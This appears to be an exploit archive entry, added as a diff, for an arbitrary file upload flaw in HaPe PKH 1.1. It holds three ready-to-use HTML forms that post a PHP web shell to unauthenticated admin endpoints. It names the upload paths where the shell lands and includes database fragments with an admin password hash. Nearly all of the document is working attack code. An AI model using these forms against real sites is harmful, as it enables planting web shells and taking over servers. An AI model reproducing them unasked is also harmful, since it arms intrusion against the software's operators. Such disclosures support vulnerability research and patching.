@@ -1,0 +1,63 @@
+# Exploit Title: HaPe PKH 1.1 - Arbitrary File Upload
+# Dork: N/A
+# Date: 2018-10-12
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: http://www.sitejo.id
+# Software Link: https://sourceforge.net/projects/hape-pkh/files/latest/download
+# Version: 1.1 
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+
+# POC: 
+# 1)
+# File => Shell.php
+# Upload Path => http://localhost/[PATH]/gambar-konten/9Shell.php
+# 
+# $foto_ksm = array(
+#  array('id_foto' => '7','id_pengurus' => '','foto' => '9Shell.php','kategori_foto' => 'Foto Profile','hari' => 'Kamis',
+# 'tgl' => '2018-10-12','jam' => '01:58:48'));
+
+<form method="POST" action="http://localhost/hape-pkh/admin/modul/mod_pengurus/aksi_foto.php?module=pengurus&act=input" enctype="multipart/form-data">
+<input name="id_art" type="hidden">
+<input name="id_pengurus" value="" type="hidden">
+<input name="fupload" size="30" accept="image/*" type="file">
+<input name="kategori_foto" value="Foto Profile" checked="" type="radio">
+<input name="kategori_foto" value="Depan" type="radio">
+<input name="kategori_foto" value="Belakang" type="radio">
+<input name="kategori_foto" value="Samping" type="radio">
+<input name="kategori_foto" value="Dalam" type="radio">
+<input class="button" value="Kembali" onclick="window.location.href='?module=pengurus&act=editpengurus&id=';" type="button">
+<input class="button" value="Upload" type="submit">
+</form>
+
+# 2)
+# File => Shell.php
+# Upload Path => http://localhost/hape-pkh/gambar-konten/14Shell.php
+# 
+# $admin = array(
+#  array('id_user' => '1','nama_lengkap' => '','jk' => '','tempat' => '','tl' => '0000-00-00','alamat' => '',
+# 'id_desa' => '','no_telp' => '','email' => '','username' => 'admin',
+# 'password' => '21232f297a57a5a743894a0e4a801fc3','level' => 'admin',
+# 'blokir' => '','foto' => '14Shell.php'));
+
+<form method="POST" enctype="multipart/form-data" action="http://localhost/hape-pkh/admin/modul/mod_user/aksi_user.php?module=user&act=update">
+<input name="id_user" value="1" type="hidden">
+<input name="username" value="admin" disabled=""> 
+<input name="fupload" size="30" type="file">
+<input value="Update" type="submit">
+</form>
+
+# 3)
+# File => Shell.php
+# Upload Path => http://localhost/hape-pkh/gambar-konten/Shell.php
+# 
+# $kecamatan = array(array('id_kecamatan' => '1','kecamatan' => '','alamat' => '',
+# 'email' => '','telp' => '','kab' => '','provinsi' => '','kodepos' => '',
+# 'ket' => '','foto' => 'Shell.php'));
+
+<form method="POST" enctype="multipart/form-data" action="http://localhost/hape-pkh/admin/modul/mod_kecamatan/aksi_kecamatan.php?module=kecamatan&act=update">
+<input name="id" value="1" type="hidden">
+<input class="input" name="fupload" size="30" accept="image/*" type="file">
+<input class="button" value="Update" type="submit"></td></tr>
+</form>
